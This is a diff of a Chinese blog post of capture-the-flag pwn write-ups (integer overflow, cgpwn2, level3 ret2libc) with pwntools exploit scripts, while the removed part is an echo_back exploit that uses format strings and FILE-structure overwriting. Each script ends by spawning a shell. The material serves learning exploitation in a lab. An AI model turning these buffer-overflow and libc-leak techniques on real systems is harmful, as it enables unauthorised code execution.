+<p>整数溢出的漏洞：<br>对于check_passwd函数开头定义的_int8（8bit），其最大为255。<br>当传入256时，会产生高位截断，取其低位，故256和1相等。 等效于 mod 255<br>所以我们可以构造passwd的长度介于[255+4,255+8)</p>
+<p>程序若正常运行是不会执行 what_is_this 函数的，所以就要想办法执行。所以就要让s溢出后的返回地址覆盖为 what_is_this 函数的地址，那么就可执行得到flag；</p>
+<p>本题中，我们的目标是覆写返回地址r，改为调用system(“cat flag”);的函数的地址。</p>
+<p>我们跟入dest，发现dest位于00000014，而s位于00000000.<br>所以dest距s是0x14h（20字节），再加上ebp（4字节）的大小，所以需要24个字节paddings垃圾数据填充</p>
+<p>EXP脚本如下：</p>
+<pre><code class="python">from pwn import *
+sh=process(&#39;./of&#39;)
+flag_addr=0x804868B
+sh.recvuntil(&#39;Your choice:&#39;)
+sh.sendline(&quot;1&quot;)
+sh.recvuntil(&quot;username:&quot;)
+sh.sendline(&quot;sixpar&quot;)
+sh.recvuntil(&quot;passwd:&quot;)
+payload = &quot;a&quot;*0x18+p32(flag_addr)
+payload = payload.ljust(259,&quot;a&quot;) #绕过检测
+sh.sendline(payload)
+sh.interactive()</code></pre>
+<h2 id="10-cgpwn2"><a href="#10-cgpwn2" class="headerlink" title="10.cgpwn2:"></a>10.cgpwn2:</h2><p>本题和第六题 level2的原理相同，能找到sysytem函数的地址 0x8048420，而唯一的区别在于此题没有cat flag或binsh的字符串，需要自己构造。</p>
+<p>hello函数中存在gets函数，即gets(&amp;s)，那么这里就存在栈溢出漏洞，栈大小是0x26</p>
+<p>查看发现，name位于bss区，即bss段地址:0804A080，bss即表示未被初始化，所以可将需要构造的字符串写入到name变量（bss段上）。<br>EXP脚本如下：</p>
+<pre><code class="python">from pwn import *
+p=process(&#39;./cg&#39;)
+string_addr=0x804a080   # bss段地址
+system_addr=0x8048420
+payload=&#39;a&#39;*(0x26+4)+p32(system_addr)+&#39;a&#39;*4+p32(string_addr) #system函数的参数是bss段内容
+p.recvuntil(&#39;please tell me your name&#39;)  #gets函数读取
+p.sendline(&#39;/bin/sh&#39;)  #name将写入bss段上
+p.recvuntil(&#39;hello,you can leave some message here:&#39;)
+p.sendline(payload)
+p.interactive()</code></pre>
+<h2 id="11-level3"><a href="#11-level3" class="headerlink" title="11.level3:"></a>11.level3:</h2><p>程序里没有找到system函数和“/bin/sh”字符串，所以只好自己通过泄露libc基址，然后通过偏移计算得到。</p>
+<pre><code class="python">#-*-coding:utf-8-*-
+from pwn import *
+#sh = remote(&quot;111.198.29.45&quot;,&quot;39255&quot;)
+sh = process(&#39;./level3&#39;)
+elf = ELF(&#39;./level3&#39;)
+libc=ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
 
-local = 0
-if local:
-    p = process(&#39;./echo_back&#39;)
-else:
-    p = remote(&quot;220.249.52.133&quot;, 32255)
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+vuln = 0x0804844B
+print &quot;write_plt =&quot;,hex(write_plt)
+print &quot;vuln =&quot;,hex(vuln)
 
-debug = 0
-if debug:
-    context.log_level = &#39;debug&#39;
+payload = &#39;A&#39;*140+p32(write_plt) +p32(vuln)  #write(1,write_got,4)  #retn
+payload += p32(1) + p32(write_got) + p32(4)  #args
+sh.sendlineafter(&#39;:\n&#39;, payload)
 
-elf = ELF(&#39;./echo_back&#39;)
-libc = ELF(&#39;./libc.so.6&#39;)
-prdi = 0x0000000000000d93   #pop_rdi_ret
-main_P_addr = 0xc6c  #main_start
-IO_stdin = libc.symbols[&#39;_IO_2_1_stdin_&#39;]
-# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
-# gdb.attach(p)
+write_addr = u32(sh.recv(4))   #leak write_got
+print &quot;write_addr =&quot;,hex(write_addr)
+libcbase = write_addr - libc.symbols[&#39;write&#39;]
+system_addr = libcbase + libc.symbols[&#39;system&#39;]
+binsh_addr = libcbase + libc.search(&#39;/bin/sh\x00&#39;).next()
+print &quot;libcbase =&quot;,hex(libcbase)
+print &quot;system_addr =&quot;,hex(system_addr)
+print &quot;binsh_addr =&quot;,hex(binsh_addr)
 
-def echo_back(size, con):
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-    p.sendlineafter(&#39;length:&#39;, str(size))
-    p.send(con)
-
-def name(name):
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;1&#39;)
-    p.sendafter(&#39;name:&#39;, name)
-
-# 泄露libc基址
-echo_back(7, &#39;%19$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-libc_s_m_addr = int(p.recvuntil(&#39;-&#39;).split(&#39;-&#39;)[0], 16) - 0xF0
-print &quot;libc_start_main :&quot;+hex(libc_s_m_addr)
-libc_base = libc_s_m_addr - libc.symbols[&#39;__libc_start_main&#39;]
-system = libc_base + libc.symbols[&#39;system&#39;]
-bin_sh = libc_base + libc.search(&#39;/bin/sh&#39;).next()
-IO_stdin_addr = libc_base + IO_stdin   # IO_stdin 的基址
-
-
-# 泄露elf基址
-echo_back(7, &#39;%13$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-elf_base = int(p.recvuntil(&#39;-&#39;, drop=True), 16) - 0xd08
-prdi = prdi + elf_base
-
-# 泄露main返回地址
-echo_back(7, &#39;%12$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-main_ebp = int(p.recvuntil(&#39;-&#39;, drop=True), 16)
-print &quot;main_rbp&quot;+hex(main_ebp)
-main_ret = main_ebp + 0x8
-print &quot;main_ret&quot;+hex(main_ret)
-
-# 修改IO_buf_base，增大输入字符数
-# gdb-peda$ p _IO_2_1_stdin_
-# $2 = {
-#   file = {
-#     _flags = 0xfbad208b, 
-#     _IO_read_ptr = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
-#     _IO_read_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
-#     _IO_read_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-#     _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,  &lt;----IO_stdin+0x8*4
-#     _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-#     _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-#     _IO_buf_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,    &lt;----IO_stdin+0x8*7
-#     _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
-
-# 可见IO_buf_base距离 _IO_2_1_stdin_ （基址） 之间有 0x8 *7 的大小
-IO_buf_base = IO_stdin_addr + 0x8 * 7
-print &quot;IO_buf_base:&quot;+hex(IO_buf_base)
-name(p64(IO_buf_base))  #设好靶子,便于打靶
-echo_back(7, &#39;%16$hhn&#39;) #因为我们的name输入位于偏移16上。
-#所以就把\x00写入IO_buf_base地址的低1字节。
-
-
-#若IO_2_1_stdin地址为0x7f84cf1228e0，
-#则IO_buf_base地址为0x7f84cf122918   (IO_2_1_stdin地址+0x8*7)
-#现在把IO_buf_base地址低位覆盖为00,所以就成了 0x7f84cf122900
-#这个地址在哪呢？
-# x/10xg 0x7f84cf122900  
-#得到的是 &lt;_IO_2_1_stdin_+32&gt; ,也就是 _IO_2_1_stdin_地址 + 0x8*4 ,
-#我们比对上方的结构体发现刚好是 _IO_write_base的地址。
-
-
-# 输入的payload将输入到 _IO_write_base 处
-# 从_IO_write_base 开始，覆盖stdinFILE结构的关键参数
-payload = p64(IO_stdin_addr + 0x83) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8)
-#payload改写后，数据如下：
-#     _IO_write_base = 0x7f84cf122963  (IO_stdin_addr + 0x83)
-#     _IO_write_ptr = 0x7f84cf122963
-#     _IO_write_end = 0x7f84cf122963
-#     _IO_buf_base = main_ret
-#     _IO_buf_end = main_ret+0x8*3
-
-#这么改写后， IO_buf_end - IO_buf_base = 0x8*3
-#根据规则将可以写入0x8*3字节的数据
-#即我们之后需要输入的3个8字节的ROP链的内容
-p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-p.sendafter(&#39;length:&#39;, payload)  
-#再读取lengrh的时候程序调用的是_isoc99_scanf函数
-#而scanf与IO_file 有内在的联系
-#我也不知道，反正通过scanf输入的字符串将写入_IO_2_1_stdin_内部
-p.sendline(&#39;&#39;)
-
-#但要想写入，前提是绕过_IO_new_file_underflow中的检测
-# 检测： if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr;
-#如果输入缓冲区里存在数据，则直接返回，
-#我们为了不让其返回，所以这里需要令 read_ptr &gt;= read_end
-
-#但问题是read_end的值会增大！ 原因如下：
-##调用_IO_SYSREAD函数最终执行系统调用读取数据
-#   count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,
-#                fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);
-#   ...
-#   ## 设置结构体指针
-#   fp-&gt;_IO_read_end += count;
-#count是我们输入的payload的长度，可见_IO_read_end 最终会加上 count，所以值会变大。
-
-#而我们又想让 read_ptr &gt;= read_end ,
-# 那如何也使得read_ptr的值变大呢？？
-
-#我们发现，
-#程序在调用_isoc99_scanf函数之后又有getchar函数，
-#而getchar函数的特性：每调用一次getchar，_IO_read_ptr 加 1
-#故我们可以反复调用getchar()函数, 最终让fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end
-for i in range(0,len(payload) - 1):
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-    p.sendlineafter(&#39;length:&#39;, &#39;0&#39;)
-
-# 实现指定位置写
-p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-p.sendlineafter(&#39;length:&#39;, p64(prdi) + p64(bin_sh) + p64(system))
-#我很好奇它这个3×0x8 字节的数据是写到哪里去啦？
-#根据以上情况的综合，我猜测是写到 main返回地址那里去了，然后刚好把main的返回地址覆盖为prdi地址。
-#即，这样？
-# main：    pop rdi
-# main+0x8: binsh_addr
-# main+0x10:system_addr
-
-p.sendline(&#39;&#39;)
-# getshell
-p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;3&#39;) # exit函数，退出main函数，所以执行main的返回地址。
-p.interactive()
-</code></pre>
-<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>我对 IO_File 类题目本来不熟悉，但是现在我大致上能够了解了。<br>睡了睡了。晚安 (¦3[▓▓] </p>
+payload = &#39;A&#39;*140+p32(system_addr)+&#39;a&#39;*4+p32(binsh_addr)
+sh.sendline(payload)
+sh.interactive()</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>今天花时间重新回顾了攻防世界的初阶pwn题，发现自己从刚开始起步时的一窍不通，到现在能够理解exp的意思。这之中走了多少歪路，呜呜。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
